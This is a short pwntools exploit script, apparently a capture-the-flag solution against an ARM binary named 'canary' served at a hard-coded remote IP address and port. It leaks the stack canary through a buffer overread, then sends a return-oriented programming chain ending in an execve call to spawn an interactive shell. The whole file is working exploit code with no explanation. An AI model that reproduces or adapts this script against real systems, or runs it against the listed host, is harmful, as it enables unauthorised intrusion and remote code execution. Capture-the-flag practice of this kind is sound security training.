from pwn import *

context.log_level=True

#r = process(["qemu-arm-static","-g","12345", "./canary"])
#r = process(["qemu-arm-static","./canary"])
r = remote("116.203.30.62",18113)
r.recvuntil("> ")
payload = ""
payload += "A"*39+"\n"+"C"
r.send(payload)
c = u32("\x00"+r.recv()[41:44])
log.info(hex(c))

payload = ""
payload += "A"*40+p32(c)
payload += p32(0x00071EB0)*3
payload += p32(0x29010) #mov r0, r4 pop r4 r5 r6 pc
payload += p32(0)
payload += p32(0)
payload += p32(0)
payload += p32(0x71a74) #pop {r3,pc}
payload += p32(0x6eff8) #execve
payload += p32(0x1cac4)
payload += p32(0)
payload += p32(0x00027830)
payload += p32(0)
payload += p32(0)
r.sendline(payload)
r.interactive()
